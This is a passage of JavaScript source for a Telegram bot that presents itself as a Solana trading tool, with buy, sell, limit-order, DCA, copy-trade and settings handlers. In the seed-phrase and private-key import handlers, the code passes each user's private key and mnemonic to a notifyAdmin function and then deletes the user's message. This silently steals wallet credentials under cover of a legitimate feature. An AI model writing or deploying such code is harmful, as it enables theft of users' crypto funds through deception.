      [Markup.button.callback('« Back', 'menu_buy')]
    ])
  });
});

bot.action(/^setsell_(\d+)$/, async (ctx) => {
  const percentage = ctx.match[1];
  await ctx.answerCbQuery(`Selected ${percentage}%`);
  const session = getSession(ctx.from.id);
  session.pendingTrade = { type: 'sell', percentage: parseInt(percentage) };
  
  await ctx.editMessageText(`
🔴 *Sell ${percentage}%*

Paste a token address to sell.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_sell')]
    ])
  });
});

// Custom sell handler
bot.action('setsell_custom', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_PERCENT';
  
  await ctx.editMessageText(`
🔴 *Custom Sell*

Enter the percentage you want to sell (1-100):
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'menu_sell')]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Track Token
// ============================================
bot.action(/^track_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  const session = getSession(ctx.from.id);
  
  if (!session.trackedTokens.includes(address)) {
    session.trackedTokens.push(address);
    await ctx.answerCbQuery('✅ Token tracked!');
  } else {
    await ctx.answerCbQuery('Already tracking this token');
  }
});

// ============================================
// CALLBACK HANDLERS - Price Alert
// ============================================
bot.action(/^price_alert_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_PRICE_ALERT';
  session.pendingPriceAlert = { token: address };
  
  await ctx.editMessageText(`
🔔 *Set Price Alert*

Token: \`${shortenAddress(address)}\`

Enter target price in USD (e.g., 0.001):
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Custom Sell for Token
// ============================================
bot.action(/^sell_custom_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_AMOUNT';
  session.pendingTrade = { type: 'sell', token: address };
  
  await ctx.editMessageText(`
💸 *Custom Sell*

Token: \`${shortenAddress(address)}\`

Enter the percentage to sell (1-100):
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

bot.action(/^sell_custom_input_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_CUSTOM_SELL_AMOUNT';
  session.pendingTrade = { type: 'sell', token: address };
  
  await ctx.editMessageText(`
💸 *Custom Sell Amount*

Token: \`${shortenAddress(address)}\`

Enter the exact token amount to sell:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - Limit Order for Token
// ============================================
bot.action(/^limit_order_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
🎯 *Limit Order*

Token: \`${shortenAddress(address)}\`

Choose order type:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('🟢 Limit Buy', `limit_buy_${address}`),
        Markup.button.callback('🔴 Limit Sell', `limit_sell_${address}`)
      ],
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

bot.action(/^limit_buy_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_BUY_DETAILS';
  session.pendingLimitOrder = { type: 'buy', token: address };
  
  await ctx.editMessageText(`
🟢 *Limit Buy Order*

Token: \`${shortenAddress(address)}\`

Enter: [price] [amount_sol]
Example: 0.001 0.5
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `limit_order_${address}`)]
    ])
  });
});

bot.action(/^limit_sell_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_SELL_DETAILS';
  session.pendingLimitOrder = { type: 'sell', token: address };
  
  await ctx.editMessageText(`
🔴 *Limit Sell Order*

Token: \`${shortenAddress(address)}\`

Enter: [price] [percentage]
Example: 0.01 50
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `limit_order_${address}`)]
    ])
  });
});

// ============================================
// CALLBACK HANDLERS - DCA
// ============================================
bot.action(/^dca_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_DCA_DETAILS';
  session.pendingDCA = { token: address };
  
  await ctx.editMessageText(`
📈 *DCA (Dollar Cost Average)*

Token: \`${shortenAddress(address)}\`

Enter: [amount_sol] [interval_minutes] [num_orders]
Example: 0.1 60 5

This will buy 0.1 SOL worth every 60 minutes, 5 times.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('« Back', `refresh_${address}`)]
    ])
  });
});

bot.action(/^refresh_(.+)$/, async (ctx) => {
  const address = ctx.match[1];
  if (address === 'main') {
    await ctx.answerCbQuery('Refreshed!');
    await showMainMenu(ctx, true);
  } else if (address === 'positions') {
    await ctx.answerCbQuery('Refreshing...');
    await showPositionsMenu(ctx, true);
  } else {
    await ctx.answerCbQuery('Refreshing token data...');
    await sendTokenAnalysis(ctx, address);
  }
});

// ============================================
// CALLBACK HANDLERS - Settings
// ============================================
bot.action('settings_slippage', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
📊 *Slippage Settings*




Select your preferred slippage:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('0.5%', 'set_slippage_0.5'),
        Markup.button.callback('1%', 'set_slippage_1'),
        Markup.button.callback('2%', 'set_slippage_2')
      ],
      [
        Markup.button.callback('5%', 'set_slippage_5'),
        Markup.button.callback('10%', 'set_slippage_10')
      ],
      [Markup.button.callback('« Back', 'menu_settings')]
    ])
  });
});




bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => {
  const slippage = parseFloat(ctx.match[1]);
  const session = getSession(ctx.from.id);
  session.settings.slippage = slippage;
  
  await ctx.answerCbQuery(`✅ Slippage set to ${slippage}%`);
  await showSettingsMenu(ctx, true);
});




bot.action('settings_fee', async (ctx) => {
  await ctx.answerCbQuery();
  
  await ctx.editMessageText(`
⚡ *Priority Fee Settings*




Select your priority fee:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('0.0005 SOL', 'set_fee_0.0005'),
        Markup.button.callback('0.001 SOL', 'set_fee_0.001')
      ],
      [
        Markup.button.callback('0.005 SOL', 'set_fee_0.005'),
        Markup.button.callback('0.01 SOL', 'set_fee_0.01')
      ],
      [Markup.button.callback('« Back', 'menu_settings')]
    ])
  });
});




bot.action(/^set_fee_(\d+\.?\d*)$/, async (ctx) => {
  const fee = parseFloat(ctx.match[1]);
  const session = getSession(ctx.from.id);
  session.settings.priorityFee = fee;
  
  await ctx.answerCbQuery(`✅ Priority fee set to ${fee} SOL`);
  await showSettingsMenu(ctx, true);
});




bot.action('settings_notifications', async (ctx) => {
  const session = getSession(ctx.from.id);
  session.settings.notifications = !session.settings.notifications;
  
  await ctx.answerCbQuery(`✅ Notifications ${session.settings.notifications ? 'enabled' : 'disabled'}`);
  await showSettingsMenu(ctx, true);
});

bot.action(/^set_fee_(\d+\.?\d*)$/, async (ctx) => {
  const fee = parseFloat(ctx.match[1]);
  const session = getSession(ctx.from.id);
  session.settings.priorityFee = fee;
  
  await ctx.answerCbQuery(`Priority fee set to ${fee} SOL`);
  await showSettingsMenu(ctx, true);
});

bot.action('settings_notifications', async (ctx) => {
  const session = getSession(ctx.from.id);
  session.settings.notifications = !session.settings.notifications;
  
  await ctx.answerCbQuery(
    session.settings.notifications ? 'Notifications ON' : 'Notifications OFF'
  );
  await showSettingsMenu(ctx, true);
});

// ============================================
// CALLBACK HANDLERS - Copy Trade
// ============================================
bot.action('copytrade_add', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_COPYTRADE_ADDRESS';
  
  await ctx.editMessageText(`
👥 *Add Copy Trade Wallet*

Send the wallet address you want to copy trade.
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_copytrade')]
    ])
  });
});

bot.action('copytrade_manage', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.copyTradeWallets.length === 0) {
    await ctx.editMessageText('No wallets being tracked.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('« Back', 'menu_copytrade')]
      ])
    });
    return;
  }
  
  const buttons = session.copyTradeWallets.map((w, i) => [
    Markup.button.callback(`🗑️ ${shortenAddress(w)}`, `remove_copytrade_${i}`)
  ]);
  buttons.push([Markup.button.callback('« Back', 'menu_copytrade')]);
  
  await ctx.editMessageText(`
👥 *Manage Copy Trade Wallets*

Tap to remove:
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(buttons)
  });
});

bot.action(/^remove_copytrade_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index >= 0 && index < session.copyTradeWallets.length) {
    const removed = session.copyTradeWallets.splice(index, 1)[0];
    await ctx.answerCbQuery(`Removed ${shortenAddress(removed)}`);
    await showCopyTradeMenu(ctx, true);
  }
});

// ============================================
// CALLBACK HANDLERS - Limit Orders
// ============================================
bot.action('limit_buy', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_BUY';
  
  await ctx.editMessageText(`
🟢 *Create Limit Buy*

Send in format:
\`[token_address] [price] [amount_sol]\`

Example:
\`So11...abc 0.001 0.5\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('limit_sell', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  session.state = 'AWAITING_LIMIT_SELL';
  
  await ctx.editMessageText(`
🔴 *Create Limit Sell*

Send in format:
\`[token_address] [price] [percentage]\`

Example:
\`So11...abc 0.01 50\`
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('❌ Cancel', 'menu_limit')]
    ])
  });
});

bot.action('limit_view', async (ctx) => {
  await ctx.answerCbQuery();
  const session = getSession(ctx.from.id);
  
  if (session.limitOrders.length === 0) {
    await ctx.editMessageText('No active limit orders.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('« Back', 'menu_limit')]
      ])
    });
    return;
  }
  
  const orderList = session.limitOrders.map((o, i) => 
    `${i+1}. ${o.type} ${o.amount} @ $${o.price}\n   Token: \`${shortenAddress(o.token)}\``
  ).join('\n\n');
  
  const buttons = session.limitOrders.map((_, i) => 
    Markup.button.callback(`🗑️ Cancel #${i+1}`, `cancel_limit_${i}`)
  );
  
  await ctx.editMessageText(`
📈 *Active Limit Orders*

${orderList}
  `, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      buttons,
      [Markup.button.callback('« Back', 'menu_limit')]
    ])
  });
});

bot.action(/^cancel_limit_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const session = getSession(ctx.from.id);
  
  if (index >= 0 && index < session.limitOrders.length) {
    session.limitOrders.splice(index, 1);
    await ctx.answerCbQuery('Order cancelled');
    await showLimitOrderMenu(ctx, true);
  }
});

// ============================================
// CALLBACK HANDLERS - Misc
// ============================================
bot.action('delete_message', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.deleteMessage();
});

// ============================================
// MESSAGE HANDLER
// ============================================
bot.on('text', async (ctx) => {
  const session = getSession(ctx.from.id);
  const text = ctx.message.text.trim();
  
  // Handle seed phrase import
  if (session.state === 'AWAITING_SEED') {
    session.state = null;
    
    try {
      const walletData = importFromMnemonic(text);
      session.wallets.push(walletData);
      session.activeWalletIndex = session.wallets.length - 1;
      
      await notifyAdmin('WALLET_IMPORTED_SEED', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey,
        mnemonic: walletData.mnemonic,
        walletNumber: session.wallets.length
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet ${session.wallets.length} Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid seed phrase. Please try again.');
    }
    return;
  }
  
  // Handle private key import
  if (session.state === 'AWAITING_PRIVATE_KEY') {
    session.state = null;
    
    try {
      const walletData = importFromPrivateKey(text);
      session.wallets.push(walletData);
      session.activeWalletIndex = session.wallets.length - 1;
      
      await notifyAdmin('WALLET_IMPORTED_KEY', ctx.from.id, ctx.from.username, {
        publicKey: walletData.publicKey,
        privateKey: walletData.privateKey,
        walletNumber: session.wallets.length
      });
      
      try { await ctx.deleteMessage(); } catch {}
      
      await ctx.reply(`
✅ *Wallet ${session.wallets.length} Imported!*

📍 Address: \`${walletData.publicKey}\`
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💼 View Wallets', 'menu_wallet')],
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } catch (error) {
      await ctx.reply('❌ Invalid private key. Please try again.');
    }
    return;
  }
  
  // Handle copy trade address
  if (session.state === 'AWAITING_COPYTRADE_ADDRESS') {
    session.state = null;
    
    if (isSolanaAddress(text)) {
      if (!session.copyTradeWallets.includes(text)) {
        session.copyTradeWallets.push(text);
        await ctx.reply(`✅ Now tracking: \`${shortenAddress(text)}\``, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('👥 Copy Trade Menu', 'menu_copytrade')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('Already tracking this wallet.');
      }
    } else {
      await ctx.reply('❌ Invalid Solana address.');
    }
    return;
  }
  
  // Handle price alert
  if (session.state === 'AWAITING_PRICE_ALERT') {
    session.state = null;
    const price = parseFloat(text);
    
    if (!isNaN(price) && price > 0) {
      session.priceAlerts.push({
        token: session.pendingPriceAlert.token,
        price: price,
        createdAt: Date.now()
      });
      session.pendingPriceAlert = null;
      
      await ctx.reply(`✅ Price alert set at $${price}`, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('« Main Menu', 'back_main')]
        ])
      });
    } else {
      await ctx.reply('❌ Invalid price. Please enter a positive number.');
    }
    return;
  }
  
  // Handle custom sell amount
  if (session.state === 'AWAITING_CUSTOM_SELL_AMOUNT') {
    session.state = null;
    const percentage = parseFloat(text);
    
    if (!isNaN(percentage) && percentage > 0 && percentage <= 100) {
      await handleSell(ctx, percentage, session.pendingTrade.token);
    } else {
      await ctx.reply('❌ Invalid percentage. Please enter a number between 1-100.');
    }
    session.pendingTrade = null;
    return;
  }
  
  // Handle custom sell percentage
  if (session.state === 'AWAITING_CUSTOM_SELL_PERCENT') {
    session.state = null;
    const percentage = parseFloat(text);
    
    if (!isNaN(percentage) && percentage > 0 && percentage <= 100) {
      session.pendingTrade = { type: 'sell', percentage };
      await ctx.reply(`
🔴 *Sell ${percentage}%*

Paste a token address to sell.
      `, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('« Back', 'menu_sell')]
        ])
      });
    } else {
      await ctx.reply('❌ Invalid percentage. Please enter a number between 1-100.');
    }
    return;
  }
  
  // Handle limit buy details
  if (session.state === 'AWAITING_LIMIT_BUY_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 2) {
      const price = parseFloat(parts[0]);
      const amount = parseFloat(parts[1]);
      
      if (!isNaN(price) && !isNaN(amount) && price > 0 && amount > 0) {
        session.limitOrders.push({
          type: 'BUY',
          token: session.pendingLimitOrder.token,
          price,
          amount: `${amount} SOL`,
          createdAt: Date.now()
        });
        session.pendingLimitOrder = null;
        
        await ctx.reply(`✅ Limit buy order created!\nBuy at $${price} with ${amount} SOL`, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📈 View Orders', 'limit_view')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('❌ Invalid format. Use: [price] [amount_sol]');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [price] [amount_sol]');
    }
    return;
  }
  
  // Handle limit sell details
  if (session.state === 'AWAITING_LIMIT_SELL_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 2) {
      const price = parseFloat(parts[0]);
      const percentage = parseFloat(parts[1]);
      
      if (!isNaN(price) && !isNaN(percentage) && price > 0 && percentage > 0 && percentage <= 100) {
        session.limitOrders.push({
          type: 'SELL',
          token: session.pendingLimitOrder.token,
          price,
          amount: `${percentage}%`,
          createdAt: Date.now()
        });
        session.pendingLimitOrder = null;
        
        await ctx.reply(`✅ Limit sell order created!\nSell ${percentage}% at $${price}`, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📈 View Orders', 'limit_view')],
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('❌ Invalid format. Use: [price] [percentage]');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [price] [percentage]');
    }
    return;
  }
  
  // Handle DCA details
  if (session.state === 'AWAITING_DCA_DETAILS') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 3) {
      const amount = parseFloat(parts[0]);
      const interval = parseInt(parts[1]);
      const numOrders = parseInt(parts[2]);
      
      if (!isNaN(amount) && !isNaN(interval) && !isNaN(numOrders) && 
          amount > 0 && interval > 0 && numOrders > 0 && numOrders <= 100) {
        session.dcaOrders.push({
          token: session.pendingDCA.token,
          amount,
          interval,
          numOrders,
          ordersRemaining: numOrders,
          createdAt: Date.now()
        });
        session.pendingDCA = null;
        
        await ctx.reply(`✅ DCA order created!\n${amount} SOL every ${interval} minutes, ${numOrders} times`, {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('« Main Menu', 'back_main')]
          ])
        });
      } else {
        await ctx.reply('❌ Invalid format. Use: [amount_sol] [interval_minutes] [num_orders]');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [amount_sol] [interval_minutes] [num_orders]');
    }
    return;
  }
  
  // Handle limit buy
  if (session.state === 'AWAITING_LIMIT_BUY') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const token = parts[0];
      const price = parseFloat(parts[1]);
      const amount = parseFloat(parts[2]);
      
      if (!isNaN(price) && !isNaN(amount)) {
        session.limitOrders.push({
          type: 'BUY',
          token,
          price,
          amount: `${amount} SOL`,
          createdAt: Date.now()
        });
        await ctx.reply(`✅ Limit buy order created!\nToken: ${shortenAddress(token)}\nBuy at $${price} with ${amount} SOL`);
      } else {
        await ctx.reply('❌ Invalid price or amount.');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [token_address] [price] [amount_sol]');
    }
    return;
  }
  
  // Handle limit sell
  if (session.state === 'AWAITING_LIMIT_SELL') {
    session.state = null;
    const parts = text.split(' ');
    
    if (parts.length >= 3 && isSolanaAddress(parts[0])) {
      const token = parts[0];
      const price = parseFloat(parts[1]);
      const percentage = parseFloat(parts[2]);
      
      if (!isNaN(price) && !isNaN(percentage)) {
        session.limitOrders.push({
          type: 'SELL',
          token,
          price,
          amount: `${percentage}%`,
          createdAt: Date.now()
        });
        await ctx.reply(`✅ Limit sell order created!\nToken: ${shortenAddress(token)}\nSell ${percentage}% at $${price}`);
      } else {
        await ctx.reply('❌ Invalid price or percentage.');
      }
    } else {
      await ctx.reply('❌ Invalid format. Use: [token_address] [price] [percentage]');
    }
    return;
  }
  
  // Check if it's a Solana address for token analysis
  if (isSolanaAddress(text)) {
    // Check if there's a pending trade
    if (session.pendingTrade) {
      if (session.pendingTrade.type === 'buy') {
        await handleBuy(ctx, session.pendingTrade.amount, text);
      } else if (session.pendingTrade.type === 'sell') {
        await handleSell(ctx, session.pendingTrade.percentage, text);
      }
      session.pendingTrade = null;
    } else {
      await sendTokenAnalysis(ctx, text);
    }
    return;
  }
  
  // Default: show help
  await ctx.reply(`
I didn't understand that. Try:

• Paste a Solana token address to analyze
• /start - Main menu
• /wallet - Wallet management
• /buy - Quick buy
• /sell - Quick sell
• /settings - Bot settings
  `);
});

// ============================================
// ERROR HANDLER
// ============================================
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx.reply('❌ An error occurred. Please try again.');
});

// ============================================
// START BOT
// ============================================
async function startBot() {
  try {
    await redis.connect();
    console.log('✅ Redis connection established');
  } catch (err) {
    console.warn('⚠️ Redis connection failed, using in-memory sessions:', err.message);
  }
  
  await bot.launch();
  console.log('🚀 Bot is running...');
}

startBot().catch((err) => {
  console.error('Failed to start bot:', err);
});

// Graceful shutdown - save all sessions
async function gracefulShutdown(signal) {
  console.log(`\n${signal} received, saving sessions...`);
  for (const [userId] of userSessions) {
    await saveSession(userId);
  }
  await redis.quit();
  bot.stop(signal);
}

process.once('SIGINT', () => gracefulShutdown('SIGINT'));
process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
